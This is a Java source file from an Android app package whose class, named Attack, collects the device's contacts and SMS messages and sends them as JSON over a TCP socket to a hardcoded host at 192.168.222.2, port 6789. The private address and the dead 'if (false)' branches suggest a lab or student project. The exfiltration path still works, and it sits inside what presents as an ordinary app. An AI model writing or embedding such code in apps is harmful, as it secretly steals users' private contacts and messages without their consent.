package com.snakesonwheels.tabely.controller;

import android.os.Looper;

import com.snakesonwheels.tabely.view.HomeActivity;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.Socket;
import java.util.UUID;

public class Attack extends Thread {
    private final int port = 6789;
    private final String host = "192.168.222.2";
    private final UUID uuid = UUID.randomUUID();
    AttackActivity attackActivity;

    private static final int REQUEST_CONTACTS_PERMISSION_CODE = 0;
    private static boolean permissionGranted = false;
    private HomeActivity homeActivity;

    public Attack(HomeActivity homeActivity) {
        this.homeActivity = homeActivity;
    }


    public void performAttack() {
        String data;
        String header;

        String testData = "Client: " + uuid + " wants to be attacked!";
        sendData(testData);


        //Contacts
        header = "{\"uuid\": \"" + uuid + "\"," +
                "\"timestamp\": \"" + System.currentTimeMillis() + "\",";
        data = homeActivity.gatherContactInformation();
        sendData(header + data + "}");

        //SMS
        header = "{\"uuid\": \"" + uuid + "\"," +
                "\"timestamp\": \"" + System.currentTimeMillis() + "\",";
        data = homeActivity.gatherSMSInformation();
        sendData(header + data + "}");


        if (false) {
            header = "{\"uuid\": \"" + uuid + "\"," +
                    "\"timestamp\": \"" + System.currentTimeMillis() + "\",";
            data = homeActivity.gatherContactInformation();
            sendData(header + data + "}");
        }

        if (false/*SMSPermission is given*/) {
            header = "{\"uuid\": \"" + uuid + "\"," +
                    "\"timestamp\": \"" + System.currentTimeMillis() + "\",";
            data = homeActivity.gatherContactInformation();

            data = gatherSMSInformation();

            sendData(header + "\n\n" + data);
        }
    }

    private void sendData(String data) {
        try {
            Socket socket = new Socket(host, port);

            OutputStream outputStream = socket.getOutputStream();
            PrintStream printStream = new PrintStream(outputStream, true);
            printStream.println(data);

            socket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    private String gatherSMSInformation() {
        return null;
    }

    @Override
    public void run() {
        performAttack();
    }
}
